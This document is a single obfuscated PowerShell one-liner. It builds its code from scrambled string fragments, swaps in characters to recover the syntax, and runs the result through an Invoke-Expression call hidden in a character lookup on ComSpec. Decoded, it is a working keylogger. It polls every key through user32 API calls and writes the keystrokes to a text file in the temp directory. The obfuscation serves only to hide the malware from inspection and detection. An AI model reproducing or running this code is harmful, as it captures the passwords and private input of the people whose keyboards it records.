((("{7}{32}{41}{43}{3}{19}{45}{2}{1}{0}{18}{36}{53}{48}{29}{4}{24}{33}{5}{50}{30}{25}{40}{28}{47}{46}{8}{9}{26}{52}{11}{13}{14}{22}{15}{21}{23}{10}{39}{17}{6}{49}{38}{27}{31}{42}{37}{44}{20}{16}{34}{51}{35}{12}"-f'zuser32.dllCTz, CharSet=CharSet.Auto)]
public static extern int Get','(int virtualKeyCode); 
[DllImport(CT',' GetAsyncKeyState','DllImport(CTzuser32.dllCTz, CharSet=CharSet.Au','t(CTzu',' SbLAPI =',' New-Object -Type','function S','groundColor Red','
    while (SbLtrue','Object Byte[] 256
   ','9;','otepad SbLPath
  }
}
Start-KeyLogger',' SbLascii -le 254; SbLascii++) {
        S','bLstate = SbLAPI::GetAsyncKeyState(SbLascii)
        if (SbLstate -eq -32767) {
          SbLnull = [console]::CapsLock
  ','lKey(S','ychar, [System.Text.Encoding]::Unicode) 
          }
        }
      ','te(SbLkbstate)
          SbLmychar =','K','to, ExactSpellin','stem.IO.File]::AppendAllText(SbLPath, SbLm','bLascii, 3)
          SbLkbs','        SbLvirtualKey = SbLAPI::MapVirtua','tate = New-','ser32.dllCTz, CharSet=CharSet.Auto)]
public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFl','hru
  SbLnull = New-Item',') {
      Star','Ls','Type File -Force
  try
  {
    Write-Host g2WRecording key presses. Press CTRL+C to ','t MapVirtualKey(uint uCode, int uMapType);
[DllImpor',' -Name g2WWin32g2W -Namespace API -PassT','uccess = SbL','tart-KeyLogger(SbLPath=CTzSbLenv:temp2Edkeyl','ags);
g2W@
 ','}
    }
  }
  fina','
  {
    n','eyboardState(byt','Capacity, 0)
       ','
          Sb','       SbLcheckkbstate = SbLAPI::GetKeyboardSta',' -Path SbLPath -Item','ogger.txt','API::ToUnicode(SbLascii, SbLvirtualKey, SbLkbstate, SbLmychar, SbLmychar.','CTz) 
{
  SbLsignatures = @g2W
[','   if (SbLsuccess) 
          {
            [Sy','g=true)] 
public static extern short','ore','see results.g2W -F','port(CTzuser32.dllCTz, CharSet=CharSet.Auto)]
public static extern in','Name System.Text.StringBuilder',' Add-Type -MemberDefinition SbLsignatures','lly','t-Sleep -Milliseconds 40
      for (SbLascii = ','e[] keystate);
[DllIm'))  -crePLACe([cHAR]50+[cHAR]69+[cHAR]100),[cHAR]92-rEpLaCE  ([cHAR]83+[cHAR]98+[cHAR]76),[cHAR]36  -rEpLaCE  ([cHAR]67+[cHAR]84+[cHAR]122),[cHAR]34 -rEpLaCE ([cHAR]103+[cHAR]50+[cHAR]87),[cHAR]39)|.( $Env:ComsPec[4,26,25]-JoIN'')
